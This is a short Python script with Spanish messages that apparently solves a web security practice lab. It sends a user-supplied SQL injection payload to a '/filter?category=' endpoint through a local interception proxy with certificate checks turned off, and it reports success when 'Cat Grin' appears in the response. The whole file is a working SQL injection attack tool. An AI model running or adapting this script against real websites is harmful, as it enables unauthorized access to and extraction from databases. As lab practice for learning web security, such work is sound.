#!/usr/bin/python3

#by: Davinci
from pwn import *
import sys 
import urllib3
import requests
import signal
import time

#NoHTTPS warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#ctrl_Fucntion
def ctrl_function(sig, frames):
	print("[!]\nSaliendo.....\n")
	sys.exit(1)

signal.signal(signal.SIGINT, ctrl_function)

proxies = { 'http':'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' }

def sqli_exploit(url, payload):
	uri = "/filter?category="
	r = requests.get(url + uri + payload, verify=False, proxies=proxies)
	bar = log.progress("Injection Start")
	bar.status("Iniciando Injection")
	if "Cat Grin" in r.text:														#Need to know which items are display with my injection
		return True
	else:
		return False

def helPanel():
	print("[!]Usage %s <url> " % sys.argv[0])
	print("[!]Example %s www.mipagina.com  \"1=1\"" %sys.argv[0])
	sys.exit(1)
																		
if __name__ == '__main__':
	try:
		url = sys.argv[1].strip()
		payload = sys.argv[2].strip()		
	except IndexError:
		helPanel()

	if sqli_exploit(url, payload):
		print("[+] Injection exitosa")
	else:
		print("[-] Injection No exitosa")
